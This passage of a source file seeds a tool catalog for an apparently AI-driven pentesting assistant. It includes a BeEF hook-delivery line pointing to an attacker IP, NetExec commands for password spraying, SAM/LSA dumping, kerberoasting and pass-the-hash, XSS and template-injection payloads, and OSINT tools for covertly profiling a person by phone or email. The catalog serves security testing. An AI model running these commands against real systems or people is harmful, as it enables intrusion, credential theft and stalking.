      'POST /api/modules/<session>/<moduleid>?token=..  run a command module (cookies, keylog, screenshot…)',
      'config + creds: /etc/beef-xss/config.yaml     (set credentials before starting)',
      'modules live in /usr/share/beef-xss/modules/  (browser/network/social_engineering/persistence/…)',
    ].join('\n'),
    example: 'beef-xss   # then deliver: <script src="http://10.10.14.5:3000/hook.js"></script>' },
  { name: 'netexec', category: 'exploit', summary: 'NetExec (nxc) — successor to CrackMapExec: the AD/network swiss-army knife over SMB/WinRM/RDP/LDAP/MSSQL/SSH/FTP/WMI. Enumerates hosts, sprays creds, lists shares/users/groups/sessions, reads password policy, dumps SAM/LSASS/secrets, kerberoasts. Run via ```execute (offensive — needs /authorize on a real target). Output auto-parses into findings (valid creds, admin/Pwn3d!, SMBv1, no-signing, writable shares, dumped hashes).',
    help: [
      'nxc smb 192.168.1.10                         enumerate host (name/domain/signing/SMBv1)',
      'nxc smb 192.168.1.10 -u admin -p password    authenticate (Pwn3d! = admin/code-exec)',
      'nxc smb 192.168.1.0/24 -u admin -p password  test creds across a whole range',
      'nxc smb 10.0.0.5 --shares                     list shares + permissions',
      'nxc smb 10.0.0.5 --sessions                   active sessions',
      'nxc smb 10.0.0.5 --users                       domain users',
      'nxc smb 10.0.0.5 --groups                      domain groups',
      'nxc smb 10.0.0.5 --pass-pol                    password policy',
      'nxc smb 10.0.0.5 -u users.txt -p passwords.txt   password spray (mix files)',
      'nxc winrm 10.0.0.5 -u admin -p password        auth over WinRM (5985)',
      'nxc rdp 10.0.0.5 -u admin -p password          test RDP auth',
      'nxc ldap 10.0.0.5 -u admin -p password         query LDAP/AD',
      'nxc smb 10.0.0.5 -u admin -p password --local-auth   local (non-domain) creds',
      'nxc smb 10.0.0.5 -u admin -p password --sam    dump the local SAM hashes',
      'nxc smb 10.0.0.5 -u admin -p password --lsa    dump LSA secrets',
      'nxc ldap 10.0.0.5 -u u -p p --kerberoasting out.txt   roast SPNs (crack with ```hashid -m 13100)',
      'nxc smb 10.0.0.5 -u "" -p ""                    null session; add -H <NTLM> for pass-the-hash',
    ].join('\n'),
    example: 'nxc smb 192.168.1.0/24 -u users.txt -p passwords.txt --continue-on-success' },
  { name: 'people-osint', category: 'osint', summary: 'Recon on a person by phone/email/username/domain — use the built-in ```osint tag: it AUTO-runs the right tools (phone→phoneinfoga; email→holehe which lists every site an email is registered on + h8mail breach; username→maigret across 3000+ sites + sherlock; domain→theHarvester) AND always returns dork/lookup leads (Truecaller, Sync.me, HaveIBeenPwned, GitHub…). Note: Maltego is GUI-only and cannot run here — these are its CLI equivalents.',
    help: '```osint <target>  (or "<phone|email|username|domain> <target> [tool]")', example: 'osint +91 9540792427   /   osint email target@corp.com' },
  { name: 'phoneinfoga', category: 'osint', summary: 'Best phone-number OSINT: country/carrier/line-type + generated Google-dork footprint across social, disposable-SMS and reputation sites. Go binary (installed in the sandbox). Prefer the ```osint tag which wraps it.',
    help: 'phoneinfoga scan -n "+CCXXXXXXXXXX"\nphoneinfoga serve (web UI)', example: 'phoneinfoga scan -n "+919540792427"' },
  { name: 'maigret', category: 'osint', summary: 'Username OSINT across 3000+ sites (successor to sherlock) — finds profiles + extracts bio/ids, writes HTML/PDF reports.',
    help: 'maigret <username> --timeout 15\n--html / --pdf for reports', example: 'maigret johndoe --timeout 15' },
  { name: 'holehe', category: 'osint', summary: 'Email OSINT — checks 120+ sites to reveal WHERE an email address is registered (without alerting the owner). The workhorse for "where does this email exist".',
    help: 'holehe --only-used <email>', example: 'holehe target@gmail.com --only-used' },
  // --- XSS payloads & testing ---
  { name: 'xss-payloads', category: 'web', summary: 'Curated cross-site-scripting payload set (script/img/svg/event-handler/case-bypass/base64-obfuscation/URI) by injection context — generate with ```payload xss [html|attr|js|uri|waf], auto-test reflection with ```webinput.',
    help: 'contexts: html attr js uri waf\n```payload xss waf', example: '<img src=x onerror=alert(1)> / <svg onload=alert(1)> / "><script>alert(1)</script>' },
  { name: 'dalfox', category: 'web', summary: 'Parameter-analysis XSS scanner — encoding-aware reflected/stored/DOM XSS testing with verification and WAF-bypass payloads.',
    help: 'url <url>\n-b hitthis.xss\n--custom-payload file', example: 'dalfox url "https://target.com/search?q=1"' },
  { name: 'XSStrike', category: 'web', summary: 'Advanced XSS detection: reflected/DOM, context analysis, WAF fingerprinting + bypass, and payload generation.',
    help: '-u URL\n--crawl\n--blind', example: 'xsstrike -u "https://target.com/?q=test"' },
  { name: 'template-injection', category: 'web', summary: 'Client/Server-Side Template Injection (CSTI/SSTI, CWE-1336/CWE-94). Detect with the {{7*7}} probe (renders 49 = injectable). ```webinput auto-probes it; ```payload xss csti|angular|vue gives sandbox-escape payloads. Escalate SSTI with tplmap.',
    help: 'probes: {{7*7}} ${7*7} <%= 7*7 %> #{7*7}\ntplmap -u "URL?q=*"', example: 'tplmap -u "https://target.com/?name=John"' },
];

export async function seedSampleTools() {
  return upsertToolDocs(SAMPLE_TOOLS, 'sample');
}
